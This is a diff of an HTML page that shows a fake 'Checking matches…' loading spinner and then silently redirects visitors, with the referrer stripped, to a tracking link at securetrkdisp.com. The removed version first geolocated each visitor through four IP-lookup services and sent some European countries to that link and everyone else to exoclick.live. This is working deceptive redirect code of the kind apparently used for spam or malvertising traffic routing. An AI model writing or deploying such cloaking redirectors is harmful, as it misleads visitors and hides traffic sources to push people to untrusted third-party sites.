@@ -1,24 +1,44 @@
 <!DOCTYPE html>
-<head><meta name="referrer" content="no-referrer"></head>
+<head>
+  <meta name="referrer" content="no-referrer">
+  <style>
+    #geo-loader{position:fixed;inset:0;background:#fff;display:flex;justify-content:center;align-items:center;font:16px/1.4 Arial,sans-serif;color:#444;z-index:999999}
+    #geo-loader .spinner{border:3px solid #f3f3f3;border-top:3px solid #3498db;border-radius:50%;width:28px;height:28px;animation:spin .7s linear infinite;margin-right:10px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+</head>
 <body>
-<style>
-#geo-loader{position:fixed;inset:0;background:#fff;display:flex;justify-content:center;align-items:center;font:16px/1.4 Arial,sans-serif;color:#444;z-index:999999}
-#geo-loader .spinner{border:3px solid #f3f3f3;border-top:3px solid #3498db;border-radius:50%;width:28px;height:28px;animation:spin .7s linear infinite;margin-right:10px}
-@keyframes spin{to{transform:rotate(360deg)}}
-</style>
-<div id="geo-loader"><div class="spinner"></div>Checking matches…</div>
-<script>
-(function(){
-const SPECIAL=new Set(["GB","UK","DE","NL","IT","BE","CZ","RO","SK"]);
-const LINK_SPECIAL="https://securetrkdisp.com/S4qkVr67jS";
-const LINK_DEFAULT="https://exoclick.live/";
-const PER_REQ_TIMEOUT=1200;
-const CACHE_KEY="geo_cc_cache_v1";
-function removeLoader(){const e=document.getElementById("geo-loader");if(e)e.remove()}
-function redirectNoReferrer(url){try{removeLoader();const a=document.createElement("a");a.href=url;a.rel="noreferrer";a.referrerPolicy="no-referrer";a.style.display="none";document.body.appendChild(a);a.click();setTimeout(()=>{location.replace(url)},50)}catch{location.replace(url)}}
-function fetchWithTimeout(url,ms,controller){const t=setTimeout(()=>controller.abort(),ms);return fetch(url,{mode:"cors",signal:controller.signal}).finally(()=>clearTimeout(t))}
-async function getCountryFast(){try{const c=sessionStorage.getItem(CACHE_KEY);if(c)return c.toUpperCase()}catch{}const ctrls=[new AbortController(),new AbortController(),new AbortController(),new AbortController()];const tasks=[fetchWithTimeout("https://ipinfo.io/json",PER_REQ_TIMEOUT,ctrls[0]).then(r=>r.json()).then(j=>j&&j.country),fetchWithTimeout("https://ipapi.co/json/",PER_REQ_TIMEOUT,ctrls[1]).then(r=>r.json()).then(j=>j&&j.country_code),fetchWithTimeout("https://ipwho.is/",PER_REQ_TIMEOUT,ctrls[2]).then(r=>r.json()).then(j=>j&&j.country_code),fetchWithTimeout("https://get.geojs.io/v1/ip/country.json",PER_REQ_TIMEOUT,ctrls[3]).then(r=>r.json()).then(j=>j&&(j.country||j.country_code))];let winner=null,resolved=false;await Promise.any(tasks.map(p=>p.then(cc=>{if(resolved||!cc)return Promise.reject();winner=String(cc).toUpperCase();resolved=true;return winner}))).catch(()=>{});ctrls.forEach(c=>{try{c.abort()}catch{}});if(winner){if(winner==="UK")winner="GB";try{sessionStorage.setItem(CACHE_KEY,winner)}catch{}}return winner}
-document.addEventListener("DOMContentLoaded",async()=>{let cc=null;try{cc=await getCountryFast()}catch{}const target=(cc&&SPECIAL.has(cc))?LINK_SPECIAL:LINK_DEFAULT;redirectNoReferrer(target)});
-})();
-</script>
+  <div id="geo-loader"><div class="spinner"></div>Checking matches…</div>
+
+  <script>
+    (function () {
+      const LINK = "https://securetrkdisp.com/S4qkVr67jS";
+
+      function removeLoader() {
+        const el = document.getElementById("geo-loader");
+        if (el) el.remove();
+      }
+
+      function redirectNoReferrer(url) {
+        try {
+          removeLoader();
+          const a = document.createElement("a");
+          a.href = url;
+          a.rel = "noreferrer";
+          a.referrerPolicy = "no-referrer";
+          a.style.display = "none";
+          document.body.appendChild(a);
+          a.click();
+
+          setTimeout(() => { location.replace(url); }, 30);
+        } catch {
+          location.replace(url);
+        }
+      }
+
+      document.addEventListener("DOMContentLoaded", () => {
+        redirectNoReferrer(LINK);
+      });
+    })();
+  </script>
 </body>
